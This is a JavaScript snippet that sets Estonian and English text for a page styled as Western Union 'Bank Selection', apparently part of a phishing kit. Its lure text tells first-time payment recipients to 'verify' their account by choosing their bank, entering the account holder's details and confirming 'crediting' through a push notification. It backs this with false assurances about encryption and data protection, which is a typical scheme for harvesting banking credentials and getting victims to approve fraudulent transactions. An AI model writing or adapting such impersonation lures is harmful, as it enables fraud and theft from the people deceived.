switch (languageCode) {
    case 'ET':
        $('title').text("Panga valik | Western Union");
        $('#wes-1').text("Raha saama");
        $('#wes-2').text("Jälgi tehingut");
        $('#wes-3').text("Leia asukohad");
        $('#wes-4').text("Abi");
        $('#wes-5').text("Raha saama");
        $('#wes-6').text("Jälgi tehingut");
        $('#wes-7').text("Leia asukohad");
        $('#wes-8').text("Abi");
        $('#wes-9').html(`
            Kuna see on esimene kord, kui te saate ülekande meie maksesüsteemis, peame me teie kontot kontrollima.
            Verifitseerimisprotsessi käigus palume teilt ja teie pangalt kinnitust standardse andmete üleslaadimise
            vormis,
            järgige allpool
            toodud juhiseid:
        `);
        $('#wes-10').html(`<span>1. </span> Valige krediteerimiseks pank.`);
        $('#wes-11').html(`<span>2. </span> Sisestage kontoomaniku kontrollimiseks vajalikud andmed.`);
        $('#wes-12').html(`<span>3. </span> Kinnitage vahendite krediteerimine push-teatega.`);
        $('#wes-13').text("Kui panga teade on kinnitatud, kantakse raha teie pangakontole.");
        $('#wes-14').text("Me krüpteerime teie ülekanded");
        $('#wes-15').text("Oleme pühendunud teie andmete kaitsmisele");
        $('#wes-16').text("Me krüpteerime teie ülekanded");
        $('#wes-17').text("Oleme pühendunud teie andmete kaitsmisele");
        break;
    case 'EN':
        $('title').text("Bank Selection | Western Union");
        $('#wes-1').text("Receive Money");
        $('#wes-2').text("Track a Transfer");
        $('#wes-3').text("Find Locations");
        $('#wes-4').text("Help");
        $('#wes-5').text("Receive Money");
        $('#wes-6').text("Track a Transfer");
        $('#wes-7').text("Find Locations");
        $('#wes-8').text("Help");
        $('#wes-9').html(`
            Since this is the first time you are receiving a transfer through our payment system, we need to verify your account.
            During the verification process, we will ask for confirmation from you and your bank in the form of a standard data
            upload,
            please follow the instructions below:
        `);
        $('#wes-10').html(`<span>1. </span> Select a bank for crediting.`);
        $('#wes-11').html(`<span>2. </span> Enter the necessary details for account holder verification.`);
        $('#wes-12').html(`<span>3. </span> Confirm the crediting of funds with a push notification.`);
        $('#wes-13').text("Once the bank notification is confirmed, the money will be credited to your bank account.");
        $('#wes-14').text("We encrypt your transfers");
        $('#wes-15').text("We are committed to protecting your data");
        $('#wes-16').text("We encrypt your transfers");
        $('#wes-17').text("We are committed to protecting your data");
        break;
}